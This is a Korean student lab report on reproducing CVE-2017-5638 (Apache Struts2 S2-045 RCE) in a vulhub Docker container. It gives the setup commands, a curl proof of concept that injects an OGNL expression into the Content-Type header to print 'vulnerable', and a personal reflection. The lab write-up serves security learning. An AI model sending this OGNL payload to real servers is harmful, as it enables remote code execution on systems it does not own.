# CVE-2017-5638 (Apache Struts2 RCE) 실습 보고서
## 1. 개요
이번 보고서는 Apache Struts2 프레임워크의 Content-Type 필드 처리 취약점(CVE-2017-5638)을 도커를 이용해 재현하고, 실제 공격이 가능한지 실습한 내용을 정리한 것이다. 이 취약점은 서버에서 외부 입력을 제대로 검증하지 않아 원격 코드 실행(RCE)로 이어질 수 있는 심각한 문제를 일으킨다.

## 2. 실습 환경
- Host OS: Windows 11
- Docker Version: 28.0.4
- Docker Compose Version: 2.34.0

## 3. 실습 과정
3.1. 취약한 환경 구성
먼저 vulhub 레포지터리를 클론하고, Struts2 s2-045 취약 버전이 설정된 디렉터리로 이동했다. 이후 docker-compose를 이용해 컨테이너를 띄웠다.

git clone https://github.com/vulhub/vulhub.git
cd vulhub/struts2/s2-045
docker compose up -d
컨테이너가 정상적으로 구동되었고, localhost:8080로 접근할 수 있었다.

3.2. 환경 구축 결과
컨테이너가 정상적으로 올라가면서 Struts2 쇼케이스 페이지가 동작하는 것을 확인했다.

## 4. 취약점 검증 (PoC)
4.1. 공격 시도
curl 명령어를 이용해 Content-Type 헤더에 OGNL 표현식을 삽입해 요청을 보냈다.

curl -v -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ctn=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']).(#ctn.getWriter().println('vulnerable')).(#ctn.getWriter().flush())}" http://localhost:8080/struts2-showcase/upload.action

4.2. 결과 확인
응답 본문에 vulnerable이라는 문자열이 출력되면서, 서버에서 OGNL 표현식이 실제로 실행된 것을 확인했다. 이를 통해 취약점이 존재함을 직접 검증할 수 있었다.

## 5. 느낀점
이번 과제를 진행하면서, 제가 제대로 방향을 잡고 수행하고 있는지 확신이 들지 않았습니다. 어쩌면 과제를 잘못 이해한 것 같다고 생각합니다. 그럼에도 불구하고 주어진 조건 안에서 할 수 있는 최선을 다해 환경을 구축하고, 취약점 검증까지 마무리하려고 노력하였습니다. 과정 중 부족한 부분이 많았던 것은 사실이지만, Docker와 취약점 환경 구축 과정을 직접 경험해볼 수 있었던 점은 큰 의미가 있었습니다. 만약 기회가 된다면, 과제 내용을 완전히 이해한 상태로 다시 한 번 제대로 도전해보고 싶습니다.

## 6. 참고 자료
- Vulhub Struts2 S2-045 환경 (https://vulhub.org/#/environments/struts2/s2-045/)
- CVE-2017-5638 상세정보 - NVD (https://nvd.nist.gov/vuln/detail/CVE-2017-5638)


## 7. GitHub 레포 링크
https://github.com/soonnae/vulhub/tree/master/struts2/s2-045

(pdf 변환 시 이미지가 보이지 않아서 github에만 넣어놓겠습니다. 죄송합니다.)
